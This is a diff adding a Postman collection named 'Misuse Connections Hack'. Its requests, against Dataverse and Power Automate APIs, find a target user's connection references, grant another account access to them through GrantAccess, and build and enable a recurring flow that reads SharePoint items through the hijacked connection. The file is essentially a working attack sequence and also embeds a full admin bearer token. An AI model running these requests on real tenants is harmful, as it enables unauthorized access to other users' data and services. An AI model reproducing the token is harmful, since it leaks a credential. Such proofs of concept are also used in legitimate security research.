@@ -1,0 +1,243 @@
+{
+	"info": {
+		"_postman_id": "cd1c23cd-99ba-4237-8503-d980f1d51da8",
+		"name": "Misuse Connections Hack",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"_exporter_id": "17311769"
+	},
+	"item": [
+		{
+			"name": "List System Users",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "{{dynamics_url}}/api/data/v9.2/systemusers?$filter=fullname eq '{{admin_name}}' or fullname eq '{{target_name}}'",
+					"host": [
+						"{{dynamics_url}}"
+					],
+					"path": [
+						"api",
+						"data",
+						"v9.2",
+						"systemusers"
+					],
+					"query": [
+						{
+							"key": "$filter",
+							"value": "fullname eq '{{admin_name}}' or fullname eq '{{target_name}}'"
+						}
+					]
+				},
+				"description": "This is used to show flow after it is created"
+			},
+			"response": []
+		},
+		{
+			"name": "List Connection References",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "{{dynamics_url}}/api/data/v9.2/connectionreferences?$filter= _createdby_value eq '{{target_sys_id}}'",
+					"host": [
+						"{{dynamics_url}}"
+					],
+					"path": [
+						"api",
+						"data",
+						"v9.2",
+						"connectionreferences"
+					],
+					"query": [
+						{
+							"key": "$filter",
+							"value": " _createdby_value eq '{{target_sys_id}}'"
+						}
+					]
+				},
+				"description": "This is used to show flow after it is created"
+			},
+			"response": []
+		},
+		{
+			"name": "Share connection Reference",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n  \"Target\": {\r\n    \"connectionreferenceid\": \"{{connectionreference_id}}\",\r\n    \"@odata.type\": \"Microsoft.Dynamics.CRM.connectionreference\"\r\n  },\r\n  \"PrincipalAccess\": {\r\n    \"Principal\": {\r\n      \"systemuserid\": \"{{admin_sys_id}}\",\r\n      \"@odata.type\": \"Microsoft.Dynamics.CRM.systemuser\"\r\n    },\r\n    \"AccessMask\": \"ReadAccess,WriteAccess,ShareAccess\"\r\n  }\r\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "{{dynamics_url}}/api/data/v9.0/GrantAccess",
+					"host": [
+						"{{dynamics_url}}"
+					],
+					"path": [
+						"api",
+						"data",
+						"v9.0",
+						"GrantAccess"
+					]
+				},
+				"description": "This is used to show flow after it is created"
+			},
+			"response": []
+		},
+		{
+			"name": "Create Flow",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n    \"category\": 5,\r\n    \"statecode\": 0,\r\n    \"istransacted\": true,\r\n    \"type\": 1,\r\n    \"triggeroncreate\": false,\r\n    \"runas\": 1,\r\n    \"triggerondelete\": false,\r\n    \"versionnumber\": 2980866,\r\n    \"asyncautodelete\": false,\r\n    \"name\": \"{{flow_name}}\",\r\n    \"ismanaged\": false,\r\n    \"businessprocesstype\": 0,\r\n    \"clientdataiscompressed\": false,\r\n    \"mode\": 0,\r\n    \"introducedversion\": \"1.0\",\r\n    \"iscrmuiworkflow\": false,\r\n    \"statuscode\": 1,\r\n    \"trustedaccess\": false,\r\n    \"subprocess\": false,\r\n    \"scope\": 4,\r\n    \"ondemand\": false,\r\n    \"componentstate\": 0,\r\n    \"planverified\": false,\r\n    \"syncworkflowlogonfailure\": false,\r\n    \"primaryentity\": \"none\",\r\n    \"clientdata\": \"{\\\"properties\\\":{\\\"connectionReferences\\\":{\\\"shared_sharepointonline\\\":{\\\"connectionName\\\":\\\"{{connection}}\\\",\\\"source\\\":\\\"Embedded\\\",\\\"id\\\":\\\"/providers/Microsoft.PowerApps/apis/shared_sharepointonline\\\",\\\"tier\\\":\\\"NotSpecified\\\"}},\\\"definition\\\":{\\\"$schema\\\":\\\"https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#\\\",\\\"contentVersion\\\":\\\"1.0.0.0\\\",\\\"parameters\\\":{\\\"$connections\\\":{\\\"defaultValue\\\":{},\\\"type\\\":\\\"Object\\\"},\\\"$authentication\\\":{\\\"defaultValue\\\":{},\\\"type\\\":\\\"SecureObject\\\"}},\\\"triggers\\\":{\\\"Recurrence\\\":{\\\"recurrence\\\":{\\\"frequency\\\":\\\"Minute\\\",\\\"interval\\\":1},\\\"metadata\\\":{\\\"operationMetadataId\\\":\\\"ef06d664-1bbe-417d-8aac-095c65a0eb02\\\"},\\\"type\\\":\\\"Recurrence\\\"}},\\\"actions\\\":{\\\"Get_items\\\":{\\\"runAfter\\\":{},\\\"metadata\\\":{\\\"operationMetadataId\\\":\\\"22ea8a5f-0415-413e-837d-1f85d83de0ce\\\"},\\\"type\\\":\\\"OpenApiConnection\\\",\\\"inputs\\\":{\\\"host\\\":{\\\"connectionName\\\":\\\"shared_sharepointonline\\\",\\\"operationId\\\":\\\"GetItems\\\",\\\"apiId\\\":\\\"/providers/Microsoft.PowerApps/apis/shared_sharepointonline\\\"},\\\"parameters\\\":{\\\"dataset\\\":\\\"https://37wcqv.sharepoint.com/sites/testsite\\\",\\\"table\\\":\\\"742435b6-7897-4636-ab8e-ec347405b9a6\\\"},\\\"authentication\\\":\\\"@parameters('$authentication')\\\"}}}}},\\\"schemaVersion\\\":\\\"1.0.0.0\\\"}\",\r\n    \"createstage\": null,\r\n    \"xaml\": null\r\n}\r\n",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "{{dynamics_url}}/api/data/v9.2/workflows",
+					"host": [
+						"{{dynamics_url}}"
+					],
+					"path": [
+						"api",
+						"data",
+						"v9.2",
+						"workflows"
+					]
+				},
+				"description": "This creates the flow.\n\nThe connection can be found in the url when creating the connection. The user would just need the envirnoment id to access the connection screen in the make.powerautomate.com site. Additional connections can be used/added to any flow but this example just uses SharePoint\n\nThe connection can be found in the url when creating the connection. Additional connections can be used/added to any flow but this example just uses SharePoint"
+			},
+			"response": []
+		},
+		{
+			"name": "List Flows",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "{{dynamics_url}}/api/data/v9.2/workflows?$filter=name eq '{{flow_name}}'",
+					"host": [
+						"{{dynamics_url}}"
+					],
+					"path": [
+						"api",
+						"data",
+						"v9.2",
+						"workflows"
+					],
+					"query": [
+						{
+							"key": "$filter",
+							"value": "name eq '{{flow_name}}'"
+						}
+					]
+				},
+				"description": "This is used to show flow after it is created"
+			},
+			"response": []
+		},
+		{
+			"name": "Turn on flow",
+			"request": {
+				"method": "PATCH",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n  \"statecode\": 1,\r\n  \"statuscode\": 2\r\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "{{dynamics_url}}/api/data/v9.2/workflows({{workflow_id}})",
+					"host": [
+						"{{dynamics_url}}"
+					],
+					"path": [
+						"api",
+						"data",
+						"v9.2",
+						"workflows({{workflow_id}})"
+					]
+				},
+				"description": "Turns flow on/ off. If using schedule trigger this can be used to make the flow run instantly"
+			},
+			"response": []
+		},
+		{
+			"name": "Change Ref",
+			"request": {
+				"method": "PATCH",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n     \"clientdata\":  \"{\\\"properties\\\":{\\\"connectionReferences\\\":{\\\"shared_sharepointonline\\\":{\\\"runtimeSource\\\":\\\"embedded\\\",\\\"connection\\\":{\\\"connectionReferenceLogicalName\\\":\\\"{{connectionReferenceLogicalName}}\\\"},\\\"api\\\":{\\\"name\\\":\\\"shared_sharepointonline\\\"}}},\\\"definition\\\":{\\\"$schema\\\":\\\"https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#\\\",\\\"contentVersion\\\":\\\"1.0.0.0\\\",\\\"parameters\\\":{\\\"$connections\\\":{\\\"defaultValue\\\":{},\\\"type\\\":\\\"Object\\\"},\\\"$authentication\\\":{\\\"defaultValue\\\":{},\\\"type\\\":\\\"SecureObject\\\"}},\\\"triggers\\\":{\\\"Recurrence\\\":{\\\"recurrence\\\":{\\\"frequency\\\":\\\"Minute\\\",\\\"interval\\\":1},\\\"metadata\\\":{\\\"operationMetadataId\\\":\\\"ef06d664-1bbe-417d-8aac-095c65a0eb02\\\"},\\\"type\\\":\\\"Recurrence\\\"}},\\\"actions\\\":{\\\"Get_items\\\":{\\\"runAfter\\\":{},\\\"metadata\\\":{\\\"operationMetadataId\\\":\\\"22ea8a5f-0415-413e-837d-1f85d83de0ce\\\"},\\\"type\\\":\\\"OpenApiConnection\\\",\\\"inputs\\\":{\\\"host\\\":{\\\"connectionName\\\":\\\"shared_sharepointonline\\\",\\\"operationId\\\":\\\"GetItems\\\",\\\"apiId\\\":\\\"/providers/Microsoft.PowerApps/apis/shared_sharepointonline\\\"},\\\"parameters\\\":{\\\"dataset\\\":\\\"https://37wcqv.sharepoint.com/sites/testsite\\\",\\\"table\\\":\\\"742435b6-7897-4636-ab8e-ec347405b9a6\\\"},\\\"authentication\\\":\\\"@parameters('$authentication')\\\"}}}},\\\"templateName\\\":\\\"\\\"},\\\"schemaVersion\\\":\\\"1.0.0.0\\\"}\"\r\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "{{dynamics_url}}/api/data/v9.2/workflows({{workflow_id}})",
+					"host": [
+						"{{dynamics_url}}"
+					],
+					"path": [
+						"api",
+						"data",
+						"v9.2",
+						"workflows({{workflow_id}})"
+					]
+				},
+				"description": "Turns flow on/ off. If using schedule trigger this can be used to make the flow run instantly"
+			},
+			"response": []
+		}
+	],
+	"auth": {
+		"type": "bearer",
+		"bearer": [
+			{
+				"key": "token",
+				"value": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IktRMnRBY3JFN2xCYVZWR0JtYzVGb2JnZEpvNCIsImtpZCI6IktRMnRBY3JFN2xCYVZWR0JtYzVGb2JnZEpvNCJ9.eyJhdWQiOiJodHRwczovL29yZzk2YmU3YzE5LmFwaS5jcm0uZHluYW1pY3MuY29tIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvNmI2YzNlZGUtYWEwZC00MjY4LWE0NmYtOTZiNzYyMWIxM2E4LyIsImlhdCI6MTcyMzExNTcxMSwibmJmIjoxNzIzMTE1NzExLCJleHAiOjE3MjMxMjAyNzcsImFjY3QiOjAsImFjciI6IjEiLCJhaW8iOiJBVlFBcS84WEFBQUFBdDNiSm1tSm1xck5EdU1xdERDKzNMNncvQlRyTnRaZ0hVa2pndUVsUk41UjJDejBWZXMyeE8rVkx3ZE0xVTIvWm9jMTNodEcwTWVDamRra2pITGlwWENaWWh4VWhibk1Eclo3c1g1MVVhST0iLCJhbXIiOlsicHdkIiwibWZhIl0sImFwcGlkIjoiNjIwNGMxZDEtNDcxMi00YzQ2LWE3ZDktM2VkNjNkOTkyNjgyIiwiYXBwaWRhY3IiOiIwIiwiZmFtaWx5X25hbWUiOiJ3eWF0dCIsImdpdmVuX25hbWUiOiJkYXZpZCIsImlkdHlwIjoidXNlciIsImlwYWRkciI6IjE2OC4yMzMuMTA5LjAiLCJsb2dpbl9oaW50IjoiTy5DaVJtWW1JNU5qTXlZUzB6WVRKbUxUUmhPRGd0WW1aaVppMDBZV0ZrTjJFNFkyRTRNV1lTSkRaaU5tTXpaV1JsTFdGaE1HUXROREkyT0MxaE5EWm1MVGsyWWpjMk1qRmlNVE5oT0JvY1FXUnRhVzVBTXpkM1kzRjJMbTl1YldsamNtOXpiMlowTG1OdmJTQmoiLCJuYW1lIjoiZGF2aWQgd3lhdHQiLCJvaWQiOiJmYmI5NjMyYS0zYTJmLTRhODgtYmZiZi00YWFkN2E4Y2E4MWYiLCJwdWlkIjoiMTAwMzIwMDJDOTA5QUQ5RiIsInJoIjoiMC5BYjBBM2o1c2F3MnFhRUtrYjVhM1loc1RxQWNBQUFBQUFBQUF3QUFBQUFBQUFBQzlBSW8uIiwic2NwIjoidXNlcl9pbXBlcnNvbmF0aW9uIiwic3ViIjoieHB4R0plM1JSdEliczdpaGFZZFk5YlZoUEN3NkFaTl8wd05HemJlM0psQSIsInRlbmFudF9yZWdpb25fc2NvcGUiOiJOQSIsInRpZCI6IjZiNmMzZWRlLWFhMGQtNDI2OC1hNDZmLTk2Yjc2MjFiMTNhOCIsInVuaXF1ZV9uYW1lIjoiQWRtaW5AMzd3Y3F2Lm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6IkFkbWluQDM3d2Nxdi5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiJ6UDU3d3B0bzgwYXFVTTBwTVFSU0FBIiwidmVyIjoiMS4wIiwid2lkcyI6WyI2MmU5MDM5NC02OWY1LTQyMzctOTE5MC0wMTIxNzcxNDVlMTAiLCJiNzlmYmY0ZC0zZWY5LTQ2ODktODE0My03NmIxOTRlODU1MDkiXSwieG1zX2lkcmVsIjoiMSAxMCJ9.h77dsGSaPTDc1OonQqvr8BN6UULKe7315MVF1bGFNQE6EKpou82UzjskHQPet5qQ7f453-jXhajJXYmaHXjtqrINw4JacTnk-ZWeLfcMBPsYfI1EFxaoRKCB7apdr2lxlNbxx3VhuE2RYLibW96Hqo2ro9fBjnu2v8EkvMuXi6RqMXJm94s2C2ctoc7hbAqWp3PQbSTszUjvtX4fX5Qww9IF21tysUy17Xx9hc9NCGBl2RXve5Q35FkZxkMLZ30icTyLTZqAV0EZbWdlhZZmC3oXvFhqz19DhQhclCmcV-DX6oGm_81-eML7N7Vptv7XdZuE5LLqMhWgr5DMyZhPDg",
+				"type": "string"
+			}
+		]
+	},
+	"event": [
+		{
+			"listen": "prerequest",
+			"script": {
+				"type": "text/javascript",
+				"packages": {},
+				"exec": [
+					""
+				]
+			}
+		},
+		{
+			"listen": "test",
+			"script": {
+				"type": "text/javascript",
+				"packages": {},
+				"exec": [
+					""
+				]
+			}
+		}
+	]
+}
